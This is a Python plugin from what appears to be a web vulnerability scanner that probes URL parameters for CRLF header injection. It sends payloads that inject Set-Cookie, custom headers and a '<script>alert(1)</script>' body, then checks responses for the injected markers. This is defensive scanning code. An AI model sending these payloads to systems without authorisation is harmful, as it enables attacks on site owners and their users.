# vibee_hacker/plugins/blackbox/crlf_to_xss.py
"""CRLF Header Injection to XSS detection plugin."""

from __future__ import annotations

import shlex
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

# Payload injects a Set-Cookie header that contains an XSS vector
# as the cookie value; also tries to inject a Content-Type header
# to enable script execution.
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf_xss=injected",
    "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "%0aSet-Cookie:crlf_xss=injected",
    "%0d%0aX-XSS-Injected:1",
]

# Headers injected successfully that we look for in the response
DETECTION_HEADERS = ["set-cookie", "x-xss-injected"]
DETECTION_COOKIE_MARKER = "crlf_xss"

MAX_PARAMS = 10


class CrlfToXssPlugin(PluginBase):
    name = "crlf_to_xss"
    description = "CRLF Header Injection to XSS — inject %0d%0a to set arbitrary headers/cookies"
    category = "blackbox"
    phase = 3
    base_severity = Severity.HIGH
    destructive_level = 1
    detection_criteria = (
        "Injected Set-Cookie or custom header appears in response after CRLF payload in parameter"
    )
    expected_evidence = "crlf_xss cookie or X-XSS-Injected header present in response"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        urls_to_test: list[str] = [target.url]
        if context:
            for crawled_url in (context.crawl_urls or [])[:10]:
                if crawled_url != target.url and "?" in crawled_url:
                    urls_to_test.append(crawled_url)

        async with httpx.AsyncClient(
            verify=target.verify_ssl,
            timeout=10,
            follow_redirects=False,
        ) as client:
            for test_url in urls_to_test:
                parsed = urlparse(test_url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                capped = dict(list(params.items())[:MAX_PARAMS])

                for param_name in capped:
                    for payload in CRLF_PAYLOADS:
                        other_params = {k: v[0] for k, v in capped.items() if k != param_name}
                        base_qs = urlencode(other_params)
                        # Do NOT double-encode — keep payload as-is
                        param_fragment = f"{param_name}={payload}"
                        raw_query = (base_qs + "&" + param_fragment) if base_qs else param_fragment
                        injected_url = urlunparse(parsed._replace(query=raw_query))

                        try:
                            resp = await client.get(injected_url)
                        except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                            continue

                        if len(resp.text) > 1_000_000:
                            continue

                        resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}

                        # Check for injected cookie
                        cookie_header = resp_headers_lower.get("set-cookie", "")
                        if DETECTION_COOKIE_MARKER in cookie_header:
                            return [Result(
                                plugin_name=self.name,
                                base_severity=self.base_severity,
                                title=f"CRLF injection → cookie injection via parameter '{param_name}'",
                                description=(
                                    f"CRLF characters in parameter '{param_name}' caused the server "
                                    f"to emit an injected Set-Cookie header ('{DETECTION_COOKIE_MARKER}'). "
                                    f"An attacker can exploit this to set arbitrary cookies, enabling "
                                    f"session fixation or XSS via cookie reflection."
                                ),
                                evidence=(
                                    f"Set-Cookie header injected: '{cookie_header[:120]}' | "
                                    f"Param: {param_name} | Payload: {payload[:60]}"
                                ),
                                cwe_id="CWE-113",
                                endpoint=test_url,
                                param_name=param_name,
                                curl_command=f"curl -D - {shlex.quote(injected_url)}",
                                rule_id="crlf_header_injection",
                            )]

                        # Check for custom injected header
                        if "x-xss-injected" in resp_headers_lower:
                            return [Result(
                                plugin_name=self.name,
                                base_severity=self.base_severity,
                                title=f"CRLF injection → arbitrary header injection via parameter '{param_name}'",
                                description=(
                                    f"CRLF characters in parameter '{param_name}' caused the server "
                                    f"to emit an injected response header (X-XSS-Injected). "
                                    f"An attacker can use this to inject Content-Type or other "
                                    f"headers to enable XSS or cache poisoning attacks."
                                ),
                                evidence=(
                                    f"X-XSS-Injected header found in response | "
                                    f"Param: {param_name} | Payload: {payload[:60]}"
                                ),
                                cwe_id="CWE-113",
                                endpoint=test_url,
                                param_name=param_name,
                                curl_command=f"curl -D - {shlex.quote(injected_url)}",
                                rule_id="crlf_header_injection",
                            )]

        return []
